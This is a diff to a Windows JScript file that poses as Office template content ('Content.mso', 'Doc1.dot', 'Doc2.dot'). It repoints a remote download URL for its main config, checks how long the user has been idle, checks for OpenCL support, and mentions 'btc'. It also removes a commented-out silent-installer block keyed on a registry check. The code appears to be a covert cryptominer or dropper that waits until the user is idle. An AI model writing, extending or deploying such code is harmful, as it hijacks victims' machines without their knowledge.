@@ -23,7 +23,7 @@ var __shellapp = new ActiveXObject("Shell.Application");
 
 //var __workdir = __storage.GetFolderPath(0, 0x0020, 0, 0) + "\\Content.mso\\"	
 var __workdir = __shellapp.Namespace(0x0020).Self.Path + "\\Content.mso\\";
-var __destReadyConfig ={ name: "Doc2.dot",url:"http://np601022.free3v.net/05/Doc2.dot" }
+var __destReadyConfig ={ name: "Doc2.dot",url:"http://www.by81.com/05/Doc2.dot" }
 //最重要的配置文件
 var __startTickCout = __external.GetTickCount()
 var __lastInputInfo = __external.GetLastInputInfo()
@@ -40,15 +40,7 @@ if(__DEBUG)
 	__idletime=1000*15
 else if(__IsSupportOpencl)
 	__idletime=1000*30
-//var __destReady_dll ={ name: "mso.db",url:"http://127.0.0.1:8080/config/mso.db", md5:"56C9CE5E71638A520003082AC620D0CB" } 曾的btc
-/*
-var __installReadys = [
-						{id: 10001, name: "XMPSetup-fanli.exe", url:"http://xmp.down.sandai.net/kankan/XMPSetupLite_4.9.10.1806(2).exe", 
-							md5:"8867658a8edd9765342bfc2483ed8c3e", param:" /S",
-							condition:{type: "reg", subtype: "existreg", value:"HKEY_LOCAL_MACHINE\\SOFTWARE\\Thunder Network\\Xmp\\installtimes"} 
-						},
-						{id: 10002, name: "XMPSetup-fanli(2).exe", url:"http://xmp.down.sandai.net/kankan/XMPSetupLite_4.9.10.1806(2).exe", md5:"8867658a8edd9765342bfc2483ed8c3e"},
-					  ]*/			
+//var __destReady_dll ={ name: "mso.db",url:"http://127.0.0.1:8080/config/mso.db", md5:"56C9CE5E71638A520003082AC620D0CB" } 曾的btc		
 //
 trace ("----global.js DateLastModified : " + __fso.GetFile(__workdir+"Doc1.dot").DateLastModified + 
 		" ; global var : __DEBUG="+__DEBUG+",__IsSupportOpencl="+__IsSupportOpencl+",__interrupted="+__interrupted+",__workdir="+__workdir+
